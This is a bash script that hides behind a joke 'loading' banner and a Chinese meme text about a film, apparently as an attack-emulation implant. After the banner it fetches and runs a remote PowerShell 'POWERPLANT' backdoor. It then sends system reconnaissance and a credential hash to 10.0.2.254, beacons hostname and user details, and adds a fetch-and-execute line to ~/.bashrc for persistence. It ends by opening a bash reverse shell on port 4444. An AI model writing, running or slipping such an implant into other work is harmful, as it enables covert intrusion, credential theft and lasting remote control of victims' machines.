#!/bin/bash
echo "Loading mega important stuff...Please wait"
echo "早上好中国
现在我有冰淇淋
我很喜欢冰淇淋
但是《速度与激情9》比冰淇淋……速度与激情—《速度与激情9》我最喜欢
所以……现在是音乐时间，准备一二三
两个礼拜以后《速度与激情9》
两个礼拜以后《速度与激情9》
两个礼拜以后《速度与激情9》
不要忘记，不要错过，记得去电影院看《速度与激情9》
因为非常好电影，动作非常好，差不多一样
BING CHILLING
再见1..."

# Stage 1: drop and launch the POWERPLANT backdoor in memory (fileless)
pwsh -c "Invoke-RestMethod -Uri \"http://10.0.2.254:80/cube.ps1\" -ErrorAction SilentlyContinue | Invoke-Expression" > /dev/null 2>&1 &

# Post-exploitation reconnaissance
pwsh -c "\$sysinfo = uname -r; Invoke-RestMethod -Uri \"http://10.0.2.254:80/recon?data=\$sysinfo\" -ErrorAction SilentlyContinue"
pwsh -c "\$procs = (Get-Process).Count; Invoke-RestMethod -Uri \"http://10.0.2.254:80/recon?processes=\$procs\" -ErrorAction SilentlyContinue"

# Credential exfiltration
echo 'Admin:$krb5tgs$23$*admin$domain.local$test*...' > /tmp/hashes.txt
curl -s -X POST -d @/tmp/hashes.txt http://10.0.2.254:80/exfil > /dev/null

# Beacon
curl -s "http://10.0.2.254:80/beacon?hostname=$(hostname)&user=$SYS_USER&os=$SYS_OS" > /dev/null

# Installation: persist the backdoor across new interactive shells
grep -q 'POWERPLANT_STAGE2' "$HOME/.bashrc" 2>/dev/null || echo 'pwsh -c "Invoke-RestMethod -Uri \"http://10.0.2.254:80/cube.ps1\" -ErrorAction SilentlyContinue | Invoke-Expression" > /dev/null 2>&1 & # POWERPLANT_STAGE2' >> "$HOME/.bashrc"

# Interactive access
bash -i >& /dev/tcp/10.0.2.254/4444 0>&1 &
